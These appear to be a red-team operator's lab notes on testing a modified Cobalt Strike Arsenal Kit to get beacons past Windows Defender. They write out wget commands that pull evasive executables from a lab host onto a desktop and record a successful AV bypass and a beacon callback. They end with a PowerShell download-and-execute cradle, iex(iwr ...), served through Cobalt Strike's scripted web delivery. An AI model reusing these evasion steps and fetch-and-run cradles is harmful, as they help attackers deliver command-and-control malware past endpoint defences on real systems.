#### Artifact Kit Testing - `arsenal-kit-mod.py` - (AV Evasion)
-------
...
running `python arsenal-kit-mod.py --avbypass` 
![[Pasted image 20250409214133.png]]
...
now going to use this `payload` to execute it - it should bypass `defender` if working properly
`wget http://192.168.127.129:80/artifactkit -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe"`
`wget http://192.168.127.134:80/a -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe"`
`wget http://192.168.127.134:80/b -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest2.exe"`

`wget http://192.168.127.134:80/a -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe"`
***Able to put directly on desktop without triggering `Defender`***
![[Pasted image 20250409214451.png]]
double clicking to see if able to catch beacon
![[Pasted image 20250409214523.png]]
was able to bypass defender properly.
`shell taskkill /F /PID 3900` to kill the beacon
![[Pasted image 20250409214611.png]]

#### Resource Kit Testing - `arsenal-kit-mod.py` - (AV Evasion)
-------
reverting `guardian` and making sure defender is `turned on`
![[Pasted image 20250409212458.png]]
generate a new `http listner`
![[Pasted image 20250409215217.png]]
generate new `payloads`
![[Pasted image 20250409215243.png]]
in `cobaltstrike` navigating to `Attacks -> Scripted Web Delivery ` and hosting at `/resourcekittest` on the `http` listener
![[Pasted image 20250409215334.png]]
using the `payload` below - this should bypass `AV` if working correctly
`iex(iwr http://192.168.127.129/resourcekittest -useb)`
